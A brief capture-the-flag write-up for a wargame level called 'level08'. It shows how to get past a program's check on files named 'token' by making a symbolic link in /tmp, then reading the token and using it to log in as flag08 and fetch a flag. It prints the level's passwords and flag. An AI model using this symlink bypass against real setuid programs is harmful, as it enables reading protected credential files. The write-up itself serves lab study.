##### 1 - Analyze content

We can't open directly the token, and the program has a security to prevent opening file called token.

----

##### 2 - Bypass security

Making a symbolic link
``ln -s ~/token /tmp/666``

Getting the token
``./level08 /tmp/666``
>quif5eloekouj29ke0vouxean

----

##### 3 - Getting the flag
``su flag08``
>password : **quif5eloekouj29ke0vouxean**

``etflag``
>Check flag.Here is your token : **25749xKZ8L7DkSCwJkT9dyv6f**
